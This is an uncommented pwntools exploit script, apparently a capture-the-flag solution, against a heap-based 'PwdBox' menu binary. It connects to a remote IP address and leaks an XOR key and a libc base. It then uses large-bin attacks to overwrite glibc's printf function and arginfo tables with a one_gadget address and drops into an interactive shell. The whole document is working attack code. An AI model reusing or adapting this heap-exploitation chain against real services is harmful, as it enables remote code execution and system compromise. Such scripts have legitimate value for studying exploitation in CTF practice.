from pwn import *
context.log_level = 'debug'
#context.terminal = ['tmux','sp','-h']


# def command(index):
#     p.sendlineafter("Choice:\n",str(index))

def add(id,size,content):
    p.sendlineafter("Input Your Choice:\n",str(1))
    p.sendlineafter("Which PwdBox You Want Add:\n",str(id))
    p.sendafter("Save:",str(id))
    p.sendlineafter("Pwd:",str(size))
    p.sendafter("Pwd:",content)
def show(id):
    p.sendlineafter("Choice:\n",str(3))
    p.sendlineafter("Check:\n",str(id))
def delete(id):
    p.sendlineafter("Choice:\n",str(4))
    p.sendlineafter("Delete:\n",str(id))
def edit(id,data):
    p.sendlineafter("Choice:\n",str(2))
    p.sendlineafter(" PwdBox You Want Edit:\n",str(id))
    p.send(str(data))
def recover(id):
    p.sendlineafter("Choice:\n",str(5))
    p.sendlineafter("you want 2 Recover:\n",str(id))

#p = process("./pwdPro")
#p=process('./pwdPro',env={'LD_PRELOAD':'./libc.so'})
p=remote('47.104.71.220',49261)
libc = ELF("libc.so")



add(0,0x500,'\n')
p.recvuntil('D:')
leak=u64(p.recv(8))
rand=leak^0xa

print hex(rand)

add(1,0x420,'\n')
add(2,0x4f0,'\n')
add(3,0x4f0,'\n')
add(4,0x600,'\n')
delete(0)
recover(0)
show(0)
p.recvuntil('Pwd is: ')
leak=u64(p.recv(8))
l=leak^rand
print hex(l)
libcbase=l-(0x7ffff7fc0be0-0x00007ffff7dd5000)
add(5,0x610,'\n')
one_gadget=libcbase+0xE6C7E



delete(2)
arena=libcbase+(0x00007ffff7fc1010-0x00007ffff7dd5000)
function_table=libcbase+(0x7ffff7fb3ff8-0x00007ffff7dc3000)
_arginfo_table=libcbase+(0x7ffff7fb4350-0x00007ffff7dc3000)
payload=p64(arena)*2+p64(0)+p64(function_table-0x20)


edit(0,payload)
add(6,0x5f0,'\n')
payload = (ord('d')-2)*8*'a'+p64(one_gadget)+'a'*0x200
edit(6,payload)
delete(4)
add(7,0x700,'\n')

arena=libcbase+(0x00007ffff7faf050-0x00007ffff7dc3000)
payload=p64(arena)*2+p64(0)+p64(_arginfo_table-0x20)
recover(4)
edit(4,payload)
delete(6)
add(8,0x800,'\n')
print hex(libcbase)
#gdb.attach(p,"b *"+str(one_gadget)+'\nb *0x7ffff7e58dc4')
#pause()
show(0)


#0x555555558060





p.interactive()
